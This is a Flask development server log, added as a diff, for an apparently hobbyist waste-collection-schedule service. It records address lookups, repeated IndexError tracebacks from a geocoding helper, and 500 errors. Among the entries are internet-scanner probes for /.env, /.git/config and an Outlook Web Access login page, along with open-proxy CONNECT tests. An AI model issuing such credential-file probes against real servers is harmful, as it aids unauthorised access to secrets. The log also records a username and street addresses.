+127.0.0.1 - - [26/Jun/2025 10:28:01] "GET /collections?address=Vfsfv HTTP/1.0" 500 -
+[2025-06-26 10:28:02,486] ERROR in app: Exception on /collections [GET]
+Traceback (most recent call last):
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 1511, in wsgi_app
+    response = self.full_dispatch_request()
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 919, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 917, in full_dispatch_request
+    rv = self.dispatch_request()
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 902, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
+  File "/home/sihanren409/hacs_waste_collection_schedule/server.py", line 47, in get_collections
+    council = get_council(address)
+  File "/home/sihanren409/hacs_waste_collection_schedule/council_lookup.py", line 14, in get_council
+    for component in data.get('results', [])[0].get('address_components', []):
+IndexError: list index out of range
+127.0.0.1 - - [26/Jun/2025 10:28:02] "GET /collections?address=Vfsfv HTTP/1.0" 500 -
+[2025-06-26 10:28:11,401] ERROR in app: Exception on /collections [GET]
+Traceback (most recent call last):
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 1511, in wsgi_app
+    response = self.full_dispatch_request()
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 919, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 917, in full_dispatch_request
+    rv = self.dispatch_request()
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 902, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
+  File "/home/sihanren409/hacs_waste_collection_schedule/server.py", line 47, in get_collections
+    council = get_council(address)
+  File "/home/sihanren409/hacs_waste_collection_schedule/council_lookup.py", line 14, in get_council
+    for component in data.get('results', [])[0].get('address_components', []):
+IndexError: list index out of range
+127.0.0.1 - - [26/Jun/2025 10:28:11] "GET /collections?address=Vfsfv HTTP/1.0" 500 -
+[2025-06-26 10:28:11,409] ERROR in app: Exception on /collections [GET]
+Traceback (most recent call last):
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 1511, in wsgi_app
+    response = self.full_dispatch_request()
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 919, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 917, in full_dispatch_request
+    rv = self.dispatch_request()
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 902, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
+  File "/home/sihanren409/hacs_waste_collection_schedule/server.py", line 47, in get_collections
+    council = get_council(address)
+  File "/home/sihanren409/hacs_waste_collection_schedule/council_lookup.py", line 14, in get_council
+    for component in data.get('results', [])[0].get('address_components', []):
+IndexError: list index out of range
+127.0.0.1 - - [26/Jun/2025 10:28:11] "GET /collections?address=Vfsfv HTTP/1.0" 500 -
+[2025-06-26 10:28:25,702] ERROR in app: Exception on /collections [GET]
+Traceback (most recent call last):
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 1511, in wsgi_app
+    response = self.full_dispatch_request()
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 919, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 917, in full_dispatch_request
+    rv = self.dispatch_request()
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 902, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
+  File "/home/sihanren409/hacs_waste_collection_schedule/server.py", line 47, in get_collections
+    council = get_council(address)
+  File "/home/sihanren409/hacs_waste_collection_schedule/council_lookup.py", line 14, in get_council
+    for component in data.get('results', [])[0].get('address_components', []):
+IndexError: list index out of range
+127.0.0.1 - - [26/Jun/2025 10:28:25] "GET /collections?address=Vfsfv HTTP/1.0" 500 -
+[2025-06-26 10:28:26,289] ERROR in app: Exception on /collections [GET]
+Traceback (most recent call last):
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 1511, in wsgi_app
+    response = self.full_dispatch_request()
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 919, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 917, in full_dispatch_request
+    rv = self.dispatch_request()
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 902, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
+  File "/home/sihanren409/hacs_waste_collection_schedule/server.py", line 47, in get_collections
+    council = get_council(address)
+  File "/home/sihanren409/hacs_waste_collection_schedule/council_lookup.py", line 14, in get_council
+    for component in data.get('results', [])[0].get('address_components', []):
+IndexError: list index out of range
+127.0.0.1 - - [26/Jun/2025 10:28:26] "GET /collections?address=Vfsfv HTTP/1.0" 500 -
+[2025-06-26 10:28:42,986] ERROR in app: Exception on /collections [GET]
+Traceback (most recent call last):
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 1511, in wsgi_app
+    response = self.full_dispatch_request()
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 919, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 917, in full_dispatch_request
+    rv = self.dispatch_request()
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 902, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
+  File "/home/sihanren409/hacs_waste_collection_schedule/server.py", line 47, in get_collections
+    council = get_council(address)
+  File "/home/sihanren409/hacs_waste_collection_schedule/council_lookup.py", line 14, in get_council
+    for component in data.get('results', [])[0].get('address_components', []):
+IndexError: list index out of range
+127.0.0.1 - - [26/Jun/2025 10:28:42] "GET /collections?address=Vfsfv HTTP/1.0" 500 -
+[2025-06-26 10:28:43,569] ERROR in app: Exception on /collections [GET]
+Traceback (most recent call last):
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 1511, in wsgi_app
+    response = self.full_dispatch_request()
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 919, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 917, in full_dispatch_request
+    rv = self.dispatch_request()
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 902, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
+  File "/home/sihanren409/hacs_waste_collection_schedule/server.py", line 47, in get_collections
+    council = get_council(address)
+  File "/home/sihanren409/hacs_waste_collection_schedule/council_lookup.py", line 14, in get_council
+    for component in data.get('results', [])[0].get('address_components', []):
+IndexError: list index out of range
+127.0.0.1 - - [26/Jun/2025 10:28:43] "GET /collections?address=Vfsfv HTTP/1.0" 500 -
+127.0.0.1 - - [26/Jun/2025 10:29:04] "GET /collections?address=58%20story%20street,%20parkville HTTP/1.0" 200 -
+127.0.0.1 - - [26/Jun/2025 10:29:04] "GET /collections?address=58%20story%20street,%20parkville HTTP/1.0" 200 -
+127.0.0.1 - - [26/Jun/2025 10:30:08] "GET /collections?address=58%20story%20street,%20parkville HTTP/1.0" 200 -
+127.0.0.1 - - [26/Jun/2025 10:30:25] "GET /collections?address=16%20Henry%20street,%20Windsor HTTP/1.0" 200 -
+127.0.0.1 - - [26/Jun/2025 10:30:50] "GET / HTTP/1.0" 404 -
+127.0.0.1 - - [26/Jun/2025 10:31:01] "GET /collections?address=16%20Henry%20street,%20Windsor HTTP/1.0" 200 -
+127.0.0.1 - - [26/Jun/2025 10:31:01] "GET /collections?address=16%20Henry%20street,%20Windsor HTTP/1.0" 200 -
+127.0.0.1 - - [26/Jun/2025 10:31:04] "GET /favicon.ico HTTP/1.0" 404 -
+127.0.0.1 - - [26/Jun/2025 10:31:08] "GET /collections?address=16%20Henry%20street,%20Windsor HTTP/1.0" 200 -
+127.0.0.1 - - [26/Jun/2025 10:31:12] "GET /security.txt HTTP/1.0" 404 -
+5.101.64.6 - - [26/Jun/2025 10:32:21] "GET / HTTP/1.0" 404 -
+127.0.0.1 - - [26/Jun/2025 10:32:57] "GET /collections?address=16%20Henry%20street,%20Windsor HTTP/1.0" 200 -
+127.0.0.1 - - [26/Jun/2025 10:32:57] "GET /collections?address=16%20Henry%20street,%20Windsor HTTP/1.0" 200 -
+5.101.64.6 - - [26/Jun/2025 10:33:09] code 400, message Bad request version ('À\x13À')
+5.101.64.6 - - [26/Jun/2025 10:33:09] "\x16\x03\x01\x05¨\x01\x00\x05¤\x03\x03³ ÞOó\x93\x89qi\x06 ~lL\x07ºjRFÿý6É¥\x8b&ÎDð$\x8b\x1b Ï|\x9bá«G©\x92ëÓüÛB\x9fßgöNü\x15´W¯\x97q\x1aí\x14\x97¬Áò\x00\x1aÀ+À/À,À0Ì©Ì¨À\x09À\x13À" HTTPStatus.BAD_REQUEST -
+5.101.64.6 - - [26/Jun/2025 10:33:10] "GET /aaa9 HTTP/1.1" 404 -
+5.101.64.6 - - [26/Jun/2025 10:33:10] code 400, message Bad request version ('À\x13À')
+5.101.64.6 - - [26/Jun/2025 10:33:10] "\x16\x03\x01\x05¨\x01\x00\x05¤\x03\x03m\x0eA\x8aS5\x14²È\x88¶6(\x0cß\x08\x82ö\x01æY°ÊÄ]6lDcô\x0eR ä­8Îsù\x0eP\x8eÀk©\x94[Óú\x87\x91\x14D^Sú,Õ¬>ØÐÁ\x99ß\x00\x1aÀ+À/À,À0Ì©Ì¨À\x09À\x13À" HTTPStatus.BAD_REQUEST -
+5.101.64.6 - - [26/Jun/2025 10:33:11] "GET /aab9 HTTP/1.1" 404 -
+127.0.0.1 - - [26/Jun/2025 10:34:28] "GET /collections?address=16%20Henry%20street,%20Windsor HTTP/1.0" 200 -
+127.0.0.1 - - [26/Jun/2025 10:34:28] "GET /collections?address=16%20Henry%20street,%20Windsor HTTP/1.0" 200 -
+127.0.0.1 - - [26/Jun/2025 10:34:57] "GET /collections?address=16%20Henry%20street,%20Windsor HTTP/1.0" 200 -
+127.0.0.1 - - [26/Jun/2025 10:34:57] "GET /collections?address=16%20Henry%20street,%20Windsor HTTP/1.0" 200 -
+127.0.0.1 - - [26/Jun/2025 10:37:23] "GET /collections?address=16%20Henry%20street,%20Windsor HTTP/1.0" 200 -
+127.0.0.1 - - [26/Jun/2025 10:37:24] "GET /collections?address=16%20Henry%20street,%20Windsor HTTP/1.0" 200 -
+127.0.0.1 - - [26/Jun/2025 10:37:32] "GET /collections?address=16%20Henry%20street,%20Windsor HTTP/1.0" 200 -
+34.173.144.148 - - [26/Jun/2025 10:37:53] code 400, message Bad request version ('À\x13À')
+34.173.144.148 - - [26/Jun/2025 10:37:53] "\x16\x03\x01\x00þ\x01\x00\x00ú\x03\x03\x000D²[ÌK7Ý\x8cïL½\x89\x9eÌÊ\x90¿¼\x8f}._\x1aW\x03\x97¨Á<¡ ÆD\x19\x0f\x14e\x17S\x9c0Â\x93 5Ö:\x9aêÀ\x92zhÓß×\x98¸W`pVÏ\x002À+À/À,À0Ì©Ì¨À\x09À\x13À" HTTPStatus.BAD_REQUEST -
+34.173.144.148 - - [26/Jun/2025 10:37:54] "GET / HTTP/1.1" 404 -
+127.0.0.1 - - [26/Jun/2025 10:40:34] "GET /collections?address=16%20Henry%20street,%20Windsor HTTP/1.0" 200 -
+127.0.0.1 - - [26/Jun/2025 10:40:34] "GET /collections?address=16%20Henry%20street,%20Windsor HTTP/1.0" 200 -
+127.0.0.1 - - [26/Jun/2025 10:43:01] "GET /collections?address=16%20Henry%20street,%20Windsor HTTP/1.0" 200 -
+127.0.0.1 - - [26/Jun/2025 10:43:02] "GET /collections?address=16%20Henry%20street,%20Windsor HTTP/1.0" 200 -
+127.0.0.1 - - [26/Jun/2025 10:43:33] "GET /collections?address=16%20Henry%20street,%20Windsor HTTP/1.0" 200 -
+127.0.0.1 - - [26/Jun/2025 10:46:17] "GET /collections?address=16%20Henry%20street,%20Windsor HTTP/1.0" 200 -
+127.0.0.1 - - [26/Jun/2025 10:46:17] "GET /collections?address=16%20Henry%20street,%20Windsor HTTP/1.0" 200 -
+127.0.0.1 - - [26/Jun/2025 10:47:09] "GET / HTTP/1.0" 404 -
+127.0.0.1 - - [26/Jun/2025 10:48:41] "GET /collections?address=16%20Henry%20street,%20Windsor HTTP/1.0" 200 -
+127.0.0.1 - - [26/Jun/2025 10:48:41] "GET /collections?address=16%20Henry%20street,%20Windsor HTTP/1.0" 200 -
+185.218.84.178 - - [26/Jun/2025 10:49:32] "GET / HTTP/1.1" 404 -
+127.0.0.1 - - [26/Jun/2025 10:49:36] "GET /collections?address=16%20Henry%20street,%20Windsor HTTP/1.0" 200 -
+127.0.0.1 - - [26/Jun/2025 10:49:36] "GET /collections?address=16%20Henry%20street,%20Windsor HTTP/1.0" 200 -
+127.0.0.1 - - [26/Jun/2025 10:50:06] "GET /collections?address=58%20story%20street,%20parkville HTTP/1.0" 200 -
+127.0.0.1 - - [26/Jun/2025 10:50:22] "GET /collections?address=58%20story%20street,%20parkville HTTP/1.0" 200 -
+127.0.0.1 - - [26/Jun/2025 10:51:57] "GET /collections?address=58%20story%20street,%20parkville HTTP/1.0" 200 -
+127.0.0.1 - - [26/Jun/2025 10:51:57] "GET /collections?address=58%20story%20street,%20parkville HTTP/1.0" 200 -
+167.94.138.203 - - [26/Jun/2025 11:02:02] "GET / HTTP/1.1" 404 -
+167.94.138.203 - - [26/Jun/2025 11:02:09] code 505, message Invalid HTTP version (2.0)
+167.94.138.203 - - [26/Jun/2025 11:02:09] "PRI * HTTP/2.0" HTTPStatus.HTTP_VERSION_NOT_SUPPORTED -
+167.94.138.203 - - [26/Jun/2025 11:02:21] "GET /favicon.ico HTTP/1.1" 404 -
+167.94.138.203 - - [26/Jun/2025 11:02:27] code 505, message Invalid HTTP version (2.0)
+167.94.138.203 - - [26/Jun/2025 11:02:27] "PRI * HTTP/2.0" HTTPStatus.HTTP_VERSION_NOT_SUPPORTED -
+167.94.138.203 - - [26/Jun/2025 11:02:34] code 400, message Bad request version ('À\x14À')
+167.94.138.203 - - [26/Jun/2025 11:02:34] "\x16\x03\x01\x00î\x01\x00\x00ê\x03\x03[{)ê{Ù6Ñ\x8e\x9dôú\x04\x8b)¡G#þsü\x14_Öº\x9cq\x08Òñõ> \x1a\x0eàqI\x9b3\x08°%1Ge\x9d\x11Â8½mè&öK%ßàFpK¤Ôª\x00&Ì¨Ì©À/À0À+À,À\x13À\x09À\x14À" HTTPStatus.BAD_REQUEST -
+167.94.138.203 - - [26/Jun/2025 11:02:36] "GET /wiki HTTP/1.1" 404 -
+207.167.67.206 - - [26/Jun/2025 11:05:14] "GET http://example.com/ HTTP/1.1" 404 -
+207.167.67.206 - - [26/Jun/2025 11:05:14] "CONNECT example.com:443 HTTP/1.1" 404 -
+207.167.67.206 - - [26/Jun/2025 11:05:15] "GET http://example.com/ HTTP/1.1" 404 -
+207.167.67.206 - - [26/Jun/2025 11:05:15] "CONNECT example.com:443 HTTP/1.1" 404 -
+[2025-06-26 11:09:44,364] ERROR in app: Exception on /collections [GET]
+Traceback (most recent call last):
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 1511, in wsgi_app
+    response = self.full_dispatch_request()
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 919, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 917, in full_dispatch_request
+    rv = self.dispatch_request()
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 902, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
+  File "/home/sihanren409/hacs_waste_collection_schedule/server.py", line 47, in get_collections
+    council = get_council(address)
+  File "/home/sihanren409/hacs_waste_collection_schedule/council_lookup.py", line 14, in get_council
+    for component in data.get('results', [])[0].get('address_components', []):
+IndexError: list index out of range
+127.0.0.1 - - [26/Jun/2025 11:09:44] "GET /collections?address=Vfsfv HTTP/1.0" 500 -
+[2025-06-26 11:09:44,373] ERROR in app: Exception on /collections [GET]
+Traceback (most recent call last):
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 1511, in wsgi_app
+    response = self.full_dispatch_request()
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 919, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 917, in full_dispatch_request
+    rv = self.dispatch_request()
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 902, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
+  File "/home/sihanren409/hacs_waste_collection_schedule/server.py", line 47, in get_collections
+    council = get_council(address)
+  File "/home/sihanren409/hacs_waste_collection_schedule/council_lookup.py", line 14, in get_council
+    for component in data.get('results', [])[0].get('address_components', []):
+IndexError: list index out of range
+127.0.0.1 - - [26/Jun/2025 11:09:44] "GET /collections?address=Vfsfv HTTP/1.0" 500 -
+127.0.0.1 - - [26/Jun/2025 11:10:03] "GET /collections?address=58%20story%20street,%20parkville HTTP/1.0" 200 -
+127.0.0.1 - - [26/Jun/2025 11:10:07] "GET /collections?address=58%20story%20street,%20parkville HTTP/1.0" 200 -
+127.0.0.1 - - [26/Jun/2025 11:10:10] "GET /collections?address=58%20story%20street,%20parkville HTTP/1.0" 200 -
+127.0.0.1 - - [26/Jun/2025 11:10:27] "GET /collections?address=16%20Henry%20street,%20Windsor HTTP/1.0" 200 -
+127.0.0.1 - - [26/Jun/2025 11:10:58] "GET /collections?address=16%20Henry%20street,%20Windsor HTTP/1.0" 200 -
+127.0.0.1 - - [26/Jun/2025 11:10:59] "GET /collections?address=16%20Henry%20street,%20Windsor HTTP/1.0" 200 -
+127.0.0.1 - - [26/Jun/2025 11:23:08] "GET /collections?address=16%20Henry%20street,%20Windsor HTTP/1.0" 200 -
+127.0.0.1 - - [26/Jun/2025 11:23:08] "GET /collections?address=16%20Henry%20street,%20Windsor HTTP/1.0" 200 -
+127.0.0.1 - - [26/Jun/2025 11:23:14] "GET /collections?address=16%20Henry%20street,%20Windsor HTTP/1.0" 200 -
+127.0.0.1 - - [26/Jun/2025 11:23:38] "GET /collections?address=30%20foot%20street,%20Frankston HTTP/1.0" 200 -
+127.0.0.1 - - [26/Jun/2025 11:25:42] "GET /collections?address=30%20foot%20street,%20Frankston HTTP/1.0" 200 -
+127.0.0.1 - - [26/Jun/2025 11:25:42] "GET /collections?address=30%20foot%20street,%20Frankston HTTP/1.0" 200 -
+127.0.0.1 - - [26/Jun/2025 11:26:36] "GET /collections?address=1%20swanston%20street,%20Melbourne HTTP/1.0" 200 -
+127.0.0.1 - - [26/Jun/2025 11:26:40] "GET /collections?address=1%20swanston%20street,%20Melbourne HTTP/1.0" 200 -
+127.0.0.1 - - [26/Jun/2025 11:33:19] "GET /collections?address=1%20swanston%20street,%20Melbourne HTTP/1.0" 200 -
+127.0.0.1 - - [26/Jun/2025 11:33:20] "GET /collections?address=1%20swanston%20street,%20Melbourne HTTP/1.0" 200 -
+[2025-06-26 11:33:58,915] ERROR in app: Exception on /collections [GET]
+Traceback (most recent call last):
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 1511, in wsgi_app
+    response = self.full_dispatch_request()
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 919, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 917, in full_dispatch_request
+    rv = self.dispatch_request()
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 902, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
+  File "/home/sihanren409/hacs_waste_collection_schedule/server.py", line 47, in get_collections
+    council = get_council(address)
+  File "/home/sihanren409/hacs_waste_collection_schedule/council_lookup.py", line 14, in get_council
+    for component in data.get('results', [])[0].get('address_components', []):
+IndexError: list index out of range
+127.0.0.1 - - [26/Jun/2025 11:33:58] "GET /collections?address=Vfsfv HTTP/1.0" 500 -
+[2025-06-26 11:33:59,458] ERROR in app: Exception on /collections [GET]
+Traceback (most recent call last):
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 1511, in wsgi_app
+    response = self.full_dispatch_request()
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 919, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 917, in full_dispatch_request
+    rv = self.dispatch_request()
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 902, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
+  File "/home/sihanren409/hacs_waste_collection_schedule/server.py", line 47, in get_collections
+    council = get_council(address)
+  File "/home/sihanren409/hacs_waste_collection_schedule/council_lookup.py", line 14, in get_council
+    for component in data.get('results', [])[0].get('address_components', []):
+IndexError: list index out of range
+127.0.0.1 - - [26/Jun/2025 11:33:59] "GET /collections?address=Vfsfv HTTP/1.0" 500 -
+127.0.0.1 - - [26/Jun/2025 11:34:15] "GET /collections?address=1%20swanston%20street,%20Melbourne HTTP/1.0" 200 -
+127.0.0.1 - - [26/Jun/2025 11:34:16] "GET /collections?address=1%20swanston%20street,%20Melbourne HTTP/1.0" 200 -
+[2025-06-26 11:35:07,449] ERROR in app: Exception on /collections [GET]
+Traceback (most recent call last):
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 1511, in wsgi_app
+    response = self.full_dispatch_request()
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 919, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 917, in full_dispatch_request
+    rv = self.dispatch_request()
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 902, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
+  File "/home/sihanren409/hacs_waste_collection_schedule/server.py", line 47, in get_collections
+    council = get_council(address)
+  File "/home/sihanren409/hacs_waste_collection_schedule/council_lookup.py", line 14, in get_council
+    for component in data.get('results', [])[0].get('address_components', []):
+IndexError: list index out of range
+127.0.0.1 - - [26/Jun/2025 11:35:07] "GET /collections?address=Vfsfv HTTP/1.0" 500 -
+[2025-06-26 11:35:08,016] ERROR in app: Exception on /collections [GET]
+Traceback (most recent call last):
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 1511, in wsgi_app
+    response = self.full_dispatch_request()
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 919, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 917, in full_dispatch_request
+    rv = self.dispatch_request()
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 902, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
+  File "/home/sihanren409/hacs_waste_collection_schedule/server.py", line 47, in get_collections
+    council = get_council(address)
+  File "/home/sihanren409/hacs_waste_collection_schedule/council_lookup.py", line 14, in get_council
+    for component in data.get('results', [])[0].get('address_components', []):
+IndexError: list index out of range
+127.0.0.1 - - [26/Jun/2025 11:35:08] "GET /collections?address=Vfsfv HTTP/1.0" 500 -
+127.0.0.1 - - [26/Jun/2025 11:35:18] "GET /collections?address=1%20swanston%20street,%20Melbourne HTTP/1.0" 200 -
+127.0.0.1 - - [26/Jun/2025 11:35:19] "GET /collections?address=1%20swanston%20street,%20Melbourne HTTP/1.0" 200 -
+127.0.0.1 - - [26/Jun/2025 11:35:50] "GET /collections?address=326%20church%20street,%20Richmond HTTP/1.0" 500 -
+127.0.0.1 - - [26/Jun/2025 11:36:56] "GET /collections?address=326%20church%20street,%20Richmond HTTP/1.0" 500 -
+127.0.0.1 - - [26/Jun/2025 11:36:57] "GET /collections?address=326%20church%20street,%20Richmond HTTP/1.0" 500 -
+127.0.0.1 - - [26/Jun/2025 11:37:44] "GET /collections?address=326%20church%20street,%20Richmond HTTP/1.0" 500 -
+127.0.0.1 - - [26/Jun/2025 11:37:45] "GET /collections?address=326%20church%20street,%20Richmond HTTP/1.0" 500 -
+204.76.203.212 - - [26/Jun/2025 11:38:11] "GET / HTTP/1.1" 404 -
+127.0.0.1 - - [26/Jun/2025 11:39:14] "GET /collections?address=326%20church%20street,%20Richmond HTTP/1.0" 500 -
+127.0.0.1 - - [26/Jun/2025 11:39:14] "GET /collections?address=326%20church%20street,%20Richmond HTTP/1.0" 500 -
+204.76.203.206 - - [26/Jun/2025 11:40:19] "GET / HTTP/1.1" 404 -
+127.0.0.1 - - [26/Jun/2025 11:40:29] "GET /collections?address=326%20church%20street,%20Richmond HTTP/1.0" 500 -
+127.0.0.1 - - [26/Jun/2025 11:40:30] "GET /collections?address=326%20church%20street,%20Richmond HTTP/1.0" 500 -
+127.0.0.1 - - [26/Jun/2025 11:40:43] "GET /collections?address=16%20Henry%20street,%20Windsor HTTP/1.0" 200 -
+127.0.0.1 - - [26/Jun/2025 11:42:56] "GET /collections?address=16%20Henry%20street,%20Windsor HTTP/1.0" 200 -
+127.0.0.1 - - [26/Jun/2025 11:42:56] "GET /collections?address=16%20Henry%20street,%20Windsor HTTP/1.0" 200 -
+127.0.0.1 - - [26/Jun/2025 11:43:14] "GET /collections?address=16%20Henry%20street,%20Windsor HTTP/1.0" 200 -
+127.0.0.1 - - [26/Jun/2025 11:43:14] "GET /collections?address=16%20Henry%20street,%20Windsor HTTP/1.0" 200 -
+127.0.0.1 - - [26/Jun/2025 11:44:44] "GET /collections?address=16%20Henry%20street,%20Windsor HTTP/1.0" 200 -
+127.0.0.1 - - [26/Jun/2025 11:44:44] "GET /collections?address=16%20Henry%20street,%20Windsor HTTP/1.0" 200 -
+127.0.0.1 - - [26/Jun/2025 11:46:20] "GET /collections?address=16%20Henry%20street,%20Windsor HTTP/1.0" 200 -
+127.0.0.1 - - [26/Jun/2025 11:46:20] "GET /collections?address=16%20Henry%20street,%20Windsor HTTP/1.0" 200 -
+127.0.0.1 - - [26/Jun/2025 11:46:36] "GET /collections?address=16%20Henry%20street,%20Windsor HTTP/1.0" 200 -
+127.0.0.1 - - [26/Jun/2025 11:46:38] "GET /collections?address=16%20Henry%20street,%20Windsor HTTP/1.0" 200 -
+127.0.0.1 - - [26/Jun/2025 11:49:21] "GET /.env HTTP/1.0" 404 -
+127.0.0.1 - - [26/Jun/2025 11:49:22] "POST / HTTP/1.0" 404 -
+103.180.171.66 - - [26/Jun/2025 11:50:04] code 400, message Bad request version ('À\x13À')
+103.180.171.66 - - [26/Jun/2025 11:50:04] "\x16\x03\x01\x00þ\x01\x00\x00ú\x03\x03y\x98.ß_À[Û\x1f<uÍï\x1b;Í®ÄÁJ¨æo}è\x9bu\x89\x01ö|Z \x88\\Ú^\x91¨G3§ü\x8c\x0d]»ú\x04x'\x06u@Ïç\x06r\x97iý\x16\x16\x0ce\x002À+À/À,À0Ì©Ì¨À\x09À\x13À" HTTPStatus.BAD_REQUEST -
+103.180.171.66 - - [26/Jun/2025 11:50:06] code 400, message Bad request version ('À\x13À')
+103.180.171.66 - - [26/Jun/2025 11:50:06] "\x16\x03\x01\x00þ\x01\x00\x00ú\x03\x034h;ª9"í@Ñ\x16E¿X\x05%{¤«bh\x02÷t\x86ì-e)ëd\x00\x94 1Tp:3O\x873\x01Âëqºj\x87\x98¯ì¶\x13Oã,\x19fÁ\x81ÏO×®Þ\x002À+À/À,À0Ì©Ì¨À\x09À\x13À" HTTPStatus.BAD_REQUEST -
+185.218.84.178 - - [26/Jun/2025 12:00:06] "GET / HTTP/1.1" 404 -
+127.0.0.1 - - [26/Jun/2025 12:00:31] "GET /owa/auth/logon.aspx HTTP/1.0" 404 -
+204.76.203.212 - - [26/Jun/2025 13:01:44] "GET / HTTP/1.1" 404 -
+127.0.0.1 - - [26/Jun/2025 13:02:14] "GET /.git/config HTTP/1.0" 404 -
+185.218.84.178 - - [26/Jun/2025 13:10:07] "GET / HTTP/1.1" 404 -
+127.0.0.1 - - [26/Jun/2025 13:21:35] "GET /.git/config HTTP/1.0" 404 -
+185.169.4.150 - - [26/Jun/2025 13:51:38] "GET / HTTP/1.1" 404 -
+185.218.84.47 - - [26/Jun/2025 13:52:02] "GET / HTTP/1.1" 404 -
+127.0.0.1 - - [26/Jun/2025 14:03:37] "GET / HTTP/1.0" 404 -
+127.0.0.1 - - [26/Jun/2025 14:03:40] "GET / HTTP/1.0" 404 -
+127.0.0.1 - - [26/Jun/2025 14:03:43] "GET / HTTP/1.0" 404 -
+127.0.0.1 - - [26/Jun/2025 14:03:46] "GET /favicon.ico HTTP/1.0" 404 -
+127.0.0.1 - - [26/Jun/2025 14:03:50] "GET /favicon.ico HTTP/1.0" 404 -
+127.0.0.1 - - [26/Jun/2025 14:07:09] "GET /.env HTTP/1.0" 404 -
+127.0.0.1 - - [26/Jun/2025 14:09:51] "GET / HTTP/1.0" 404 -
+204.76.203.212 - - [26/Jun/2025 14:21:12] "GET / HTTP/1.1" 404 -
